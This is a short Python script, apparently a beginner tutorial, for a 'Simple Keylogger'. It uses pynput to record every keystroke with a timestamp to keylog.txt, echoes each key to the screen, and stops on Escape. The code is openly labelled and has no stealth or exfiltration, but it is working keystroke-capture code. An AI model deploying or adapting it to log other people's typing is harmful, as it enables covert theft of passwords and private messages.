# Import the required modules
from pynput import keyboard  # For monitoring keyboard
import logging              # For saving data to files

# Configure logging to save keystrokes to a file
logging.basicConfig(
    filename="keylog.txt",                    # Save to this file
    level=logging.DEBUG,                      # Log all message types
    format='%(asctime)s: %(message)s'        # Include timestamp in logs
)

def on_press(key):
    """This function runs every time a key is pressed"""
    try:
        # Try to get the character representation of the key
        character = key.char
        
        # Log the character to file
        logging.info(f'Character pressed: {character}')
        
        # Also display it on screen
        print(f'You pressed: {character}')
        
    except AttributeError:
        # This happens when the key doesn't have a character (like Ctrl, Alt, etc.)
        
        # Log the special key to file
        logging.info(f'Special key pressed: {key}')
        
        # Display it on screen
        print(f'Special key pressed: {key}')

def on_release(key):
    """This function runs every time a key is released"""
    
    # Check if the released key is the Escape key
    if key == keyboard.Key.esc:
        print("Escape key detected - stopping keylogger")
        
        # Log that the keylogger is stopping
        logging.info("Keylogger stopped by user")
        
        # Return False to stop the listener
        return False

# Main program starts here
print("=== Simple Keylogger ===")
print("Starting keylogger...")
print("All keystrokes will be saved to 'keylog.txt'")
print("Press Escape to stop the keylogger")
print("-" * 40)

# Create and start the keyboard listener
with keyboard.Listener(
    on_press=on_press,      # Function to call when key is pressed
    on_release=on_release   # Function to call when key is released
) as listener:
    # Start listening for keyboard events
    listener.join()

# This runs after the listener stops
print("Keylogger stopped successfully!")
print("Check 'keylog.txt' file to see captured keystrokes")
